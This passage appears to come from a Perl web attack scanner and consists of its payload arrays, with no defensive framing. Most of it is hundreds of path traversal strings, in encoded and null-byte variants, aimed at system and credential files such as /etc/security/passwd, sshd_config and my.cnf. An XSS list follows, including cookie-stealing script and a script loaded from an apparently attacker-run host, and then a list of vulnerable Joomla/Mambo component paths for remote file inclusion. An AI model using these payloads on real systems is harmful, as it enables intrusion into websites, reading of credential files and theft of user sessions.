,"..%2Fetc%2Fgroup","..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","%2Fetc%2Fgroup%00","..%2Fetc%2Fgroup%00","..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","%2F%2Fetc/group","....%2F%2Fetc/group","....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","/etc/group%00","....%2F%2Fetc/group%00","....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","//etc/group","....//etc/group","....//....//etc/group","....//....//....//etc/group","....//....//....//....//etc/group","....//....//....//....//....//etc/group","....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//....//etc/group","//etc/group%00","....//etc/group%00","....//....//etc/group%00","....//....//....//etc/group%00","....//....//....//....//etc/group%00","....//....//....//....//....//etc/group%00","....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//....//etc/group%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/group","../etc/security/group","../../etc/security/group","../../../etc/security/group","../../../../etc/security/group","../../../../../etc/security/group","../../../../../../etc/security/group","../../../../../../../etc/security/group","../../../../../../../../etc/security/group","../../../../../../../../../etc/security/group","../../../../../../../../../../etc/security/group","/etc/security/group%00","../etc/security/group%00","../../etc/security/group%00","../../../etc/security/group%00","../../../../etc/security/group%00","../../../../../etc/security/group%00","../../../../../../etc/security/group%00","../../../../../../../etc/security/group%00","../../../../../../../../etc/security/group%00","../../../../../../../../../etc/security/group%00","../../../../../../../../../../etc/security/group%00","%2Fetc%2Fsecurity%2Fgroup","..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","%2Fetc%2Fsecurity%2Fgroup%00","..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","%2F%2Fetc/security/group","....%2F%2Fetc/security/group","....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","%2F%2Fetc/security/group%00","....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","//etc/security/group","....//etc/security/group","....//....//etc/security/group","....//....//....//etc/security/group","....//....//....//....//etc/security/group","....//....//....//....//....//etc/security/group","....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//....//etc/security/group","//etc/security/group%00","....//etc/security/group%00","....//....//etc/security/group%00","....//....//....//etc/security/group%00","....//....//....//....//etc/security/group%00","....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//....//etc/security/group%00","/etc/host.deny","../etc/host.deny","../../etc/host.deny","../../../etc/host.deny","../../../../..//etc/host.deny","/etc/my.cnf","..//etc/my.cnf","../etc/my.cnf","../../../etc/my.cnf","../../../../etc/my.cnf","../../../../../etc/my.cnf","../../../../../../etc/my.cnf","../../../../../../../etc/my.cnf","../../../../../../../../etc/my.cnf","../../../../../../../../../etc/my.cnf","..//etc/my.cnf","..//..//..//etc/my.cnf","..//..//..//..//etc/my.cnf","..//..//..//..//..//etc/my.cnf","..//..//..//..//..//..//etc/my.cnf","..//..//..//..//..//..//..//etc/my.cnf","..//..//..//..//..//..//..//..//etc/my.cnf","..//..//..//..//..//..//..//..//..//etc/my.cnf","/etc/host.allow","../etc/host.allow","../../etc/host.allow","../../../etc/host.allow","../../../../etc/host.allow","../../../../../etc/host.allow","../../../../../../../etc/host.allow","../../../../../../../../../etc/host.allow","../../../../../../../../../../../etc/host.allow","../../../../../../../../../../../../../../etc/host.allow","//etc/host.allow","..//etc/host.allow","..//..//etc/host.allow","..//..//..//etc/host.allow","..//..//..//..//etc/host.allow","..//..//..//..//..//etc/host.allow","..//..//..//..//..//..//..//etc/host.allow","..//..//..//..//..//..//..//..//..//etc/host.allow","..//..//..//..//..//..//..//..//..//..//..//etc/host.allow","..//..//..//..//..//..//..//..//..//..//..//..//..//..//etc/host.allow","/etc/httpd/conf/httpd.conf","../etc/httpd/conf/httpd.conf","../../etc/httpd/conf/httpd.conf","../../../etc/httpd/conf/httpd.conf","../../../../etc/httpd/conf/httpd.conf","../../../../../etc/httpd/conf/httpd.conf","../../../../../../etc/httpd/conf/httpd.conf","../../../../../../../etc/httpd/conf/httpd.conf","../../../../../../../../etc/httpd/conf/httpd.conf","../../../../../../../../../etc/httpd/conf/httpd.conf","../../../../../../../../../../etc/httpd/conf/httpd.conf","../../../../../../../../../../../etc/httpd/conf/httpd.conf","../../../../../../../../../../../../etc/httpd/conf/httpd.conf","../../../../../../../../../../../../../etc/httpd/conf/httpd.conf","//etc/httpd/conf/httpd.conf","..//..//etc/httpd/conf/httpd.conf","..//..//..//etc/httpd/conf/httpd.conf","..//..//..//..//etc/httpd/conf/httpd.conf","..//..//..//..//..//etc/httpd/conf/httpd.conf","..//..//..//..//..//..//etc/httpd/conf/httpd.conf","..//..//..//..//..//..//..//etc/httpd/conf/httpd.conf","..//..//..//..//..//..//..//..//etc/httpd/conf/httpd.conf","..//..//..//..//..//..//..//..//..//etc/httpd/conf/httpd.conf","..//..//..//..//..//..//..//..//..//..//etc/httpd/conf/httpd.conf","..//..//..//..//..//..//..//..//..//..//..//etc/httpd/conf/httpd.conf","..//..//..//..//..//..//..//..//..//..//..//..//etc/httpd/conf/httpd.conf"
,"../etc/resolv.conf","../../etc/resolv.conf","../../../etc/resolv.conf","../../../../etc/resolv.conf","../../../../../../etc/resolv.conf","../../../../../../../../etc/resolv.conf","../../../../../../../../../etc/resolv.conf","../../../../../../../../../../../etc/resolv.conf","../../../../../../../../../../../../etc/resolv.conf","../../../../../../../../../../../../../../..etc/resolv.conf","..//etc/resolv.conf","..//..//etc/resolv.conf","..//..//..//etc/resolv.conf","..//..//..//..//etc/resolv.conf","../..//..//..//..//etc/resolv.conf","..//..//..//..//..//..//etc/resolv.conf","..//..//..//..//..//..//..//etc/resolv.conf","..//..//..//..//..//..//..//..//etc/resolv.conf","..//..//..//..//..//..//..//..//..//etc/resolv.conf","..//..//..//..//..//..//..//..//..//..//..//etc/resolv.conf","..//..//..//..//..//..//..//..//..//..//..//..//..//..//etc/resolv.conf","/etc/motd","../etc/motd","../../etc/motd","../../../etc/motd","../../../../etc/motd","../../../../../etc/motd","../../../../../../etc/motd","../../../../../../../etc/motd","../../../../../../../../etc/motd","//etc/motd","..//..//etc/motd","..//..//..//etc/motd","..//..//..//..//..//etc/motd","..//..//..//..//..//..//etc/motd","..//..//..//..//..//..//..//etc/motd","..//..//..//..//..//..//..//..//etc/motd","..//..//..//..//..//..//..//..//..//..//etc/motd","..//..//..//..//..//..//..//..//..//..//..//..//etc/motd","..//..//..//..//..//..//..//..//..//..//..//..//..//..//etc/motd","..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//etc/motd","..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//etc/motd","/etc/crontab","../etc/crontab","../../etc/crontab","../../../etc/crontab","../../../../etc/crontab","../../../../../etc/crontab","../../../../../../etc/crontab","../../../../../../../etc/crontab","../../../../../../../../etc/crontab","../../../../../../../../../etc/crontab","//etc/crontab","..//etc/crontab","..//..//etc/crontab","..//..//..//etc/crontab","..//..//..//..//etc/crontab","..//..//..//..//..//etc/crontab","..//..//..//..//..//..//etc/crontab","..//..//..//..//..//..//..//etc/crontab","..//..//..//..//..//..//..//..//etc/crontab","..//..//..//..//..//..//..//..//..//etc/crontab","/etc/ssh/sshd_config","../etc/ssh/sshd_config","../../etc/ssh/sshd_config","../../../etc/ssh/sshd_config","../../../../etc/ssh/sshd_config","../../../../../etc/ssh/sshd_config","../../../../../../etc/ssh/sshd_config","../../../../../../../etc/ssh/sshd_config","../../../../../../../../etc/ssh/sshd_config","../../../../../../../../../etc/ssh/sshd_config","//etc/ssh/sshd_config","..//etc/ssh/sshd_config","..//..//etc/ssh/sshd_config","..//..//..//etc/ssh/sshd_config","..//..//..//..//etc/ssh/sshd_config","..//..//..//..//..//etc/ssh/sshd_config","..//..//..//..//..//..//etc/ssh/sshd_config","..//..//..//..//..//..//..//etc/ssh/sshd_config","..//..//..//..//..//..//..//..//etc/ssh/sshd_config","..//..//..//..//..//..//..//..//..//etc/ssh/sshd_config","..//..//..//..//..//..//..//..//..//..//etc/ssh/sshd_config","..//..//..//..//..//..//..//..//..//..//..//etc/ssh/sshd_config","..//..//..//..//..//..//..//..//..//..//..//..//etc/ssh/sshd_config"
);
######
@XSS = ("Fallag crx",
"<center>crx</center>",
"<center><marquee>crx</marquee> </center>",
"<CeNTer>crx</CeNTer>",
"='><script>alert(document.cookie)</script>",
"&lt;script&gt;alert('crx');&lt;/script&gt",
"a?<script>alert('crx')</script>",
"<SCRIPT>a=/crx/alert(a.source)</SCRIPT>",
"%3Cscript%3Ealert('crx')%3C/script%3E",
"<IMG SRC=javascript:alert(String.fromCharCode(56,56,44,56,51,44,56,51))>",
"<IMG SRC=javascript:alert('crx')>",
"<SCRIPT>a=/crx/alert(a.source)</SCRIPT>",
"<SCRIPT SRC=http://MrTieDie-blackhat.persiangig.com/XSS.JS?<B>");

######
@RFI = ("/components/com_flyspray/startdown.php?file=",
"/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=",
"/components/com_simpleboard/file_upload.php?sbp=",
"/components/com_hashcash/server.php?mosConfig_absolute_path=",
"/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=",
"/components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=",
"/components/com_performs/performs.php?mosConfig_absolute_path=",
"/components/com_forum/download.php?phpbb_root_path=",
"/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=",
"/components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=",
"/components/minibb/index.php?absolute_path=",
"/components/com_smf/smf.php?mosConfig_absolute_path=",
"/modules/mod_calendar.php?absolute_path=",
"/components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=",
"/components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=",
"/components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=",
"/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=",
"/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=",
"/administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=",
"/administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=",
"/administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=",
"/components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=",
"/components/com_securityimages/configinsert.php?mosConfig_absolute_path=",
"/components/com_securityimages/lang.php?mosConfig_absolute_path=",
"/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=",
"/components/com_galleria/galleria.html.php?mosConfig_absolute_path=",
"/akocomments.php?mosConfig_absolute_path=",
"/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=",
"/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=",
"/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=",
"/components/com_zoom/classes/fs_unix.php?mosConfig_absolute_path=",
"/components/com_zoom/includes/database.php?mosConfig_absolute_path=",
"/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=",
"/components/com_fm/fm.install.php?lm_absolute_path=",
"/administrator/components/com_mambelfish/mambelfish.class.php?mosConfig_absolute_path=",
"/components/com_lmo/lmo.php?mosConfig_absolute_path=",
"/administrator/components/com_webring/admin.webring.docs.php?component_dir=",
"/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=",
"/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=",
"/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=",
"/components/com_mambowiki/MamboLogin.php?IP=",
"/administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=",
"/administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=",
"/components/com_cpg/cpg.php?mosConfig_absolute_path=",
"/components/com_moodle/moodle.php?mosConfig_absolute_path=",
"/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path=",
"/components/com_mospray/scripts/admin.php?basedir=",
"/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=",
"/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path=",
"/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=",
"/components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path=",
"/components/com_madeira/img.php?url=",
"/components/com_bsq_sitestats/external/rssfeed.php?baseDir=",
"/com_bsq_sitestats/external/rssfeed.php?baseDir=",
"/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=",
